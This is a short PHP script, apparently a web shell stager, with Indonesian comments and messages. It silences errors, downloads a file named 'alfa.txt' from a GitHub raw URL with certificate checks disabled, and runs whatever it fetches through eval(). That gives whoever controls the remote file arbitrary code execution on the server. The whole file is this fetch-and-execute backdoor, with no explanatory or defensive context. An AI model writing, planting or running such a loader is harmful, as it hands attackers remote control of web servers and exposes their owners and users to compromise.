<?php
error_reporting(0);

$remote_file = "https://raw.githubusercontent.com/danielyzx123/alfa.txt/refs/heads/main/alfa.txt";

if (function_exists('curl_init')) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $remote_file);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    $content = curl_exec($ch);
    curl_close($ch);
} else {
    die("CURL tidak tersedia, allow_url_fopen dimatikan. Tidak bisa download file.");
}

if (!empty($content)) {
    // Jalankan kode PHP dari remote
    eval($content);
} else {
    echo "Gagal mengambil file dari GitHub raw URL.";
}
?>
